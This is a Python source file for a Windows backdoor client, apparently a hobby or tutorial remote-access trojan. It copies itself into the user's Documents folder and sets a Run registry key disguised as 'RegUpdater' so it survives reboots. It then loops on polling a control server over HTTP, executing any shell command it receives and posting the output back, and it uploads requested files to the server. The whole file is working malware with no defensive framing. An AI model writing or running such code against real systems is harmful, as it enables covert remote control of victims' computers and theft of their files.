import requests
import shutil
import subprocess
import _winreg as wreg
import time
import os

targetfile = 'client.exe'
server = "http://192.168.178.11"

#get work dir
path = os.getcwd().strip('/n')

#get userprofile
Null,userprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')

#where to copy
desination = userprof.strip('\n\r') + '\\Documents\\' + targetfile

#if not existsmake key
if not os.path.exists(desination):
    shutil.copyfile(path+'\%s' %targetfile, desination)

    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER,"Software\Microsoft\Windows\CurrentVersion\Run", 0,wreg.KEY_ALL_ACCESS)
    wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, desination)
    key.Close()

while True:

    req = requests.get(server)
    command = req.text

    if 'terminate' in command:
        break

    elif 'grab' in command:

        grab,path=command.split('*')
        if os.path.exists(path):
            url = '%s/store' %server
            files = {'file': open(path, 'rb')}
            r = requests.post(url, files=files)
        else:
            post_response = requests.post(url=server,data='[-] Not able to find the file !')

    else:
        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        post_response = requests.post( url=server, data=CMD.stdout.read() )
        post_response = requests.post( url=server, data=CMD.stderr.read() )

    time.sleep(3)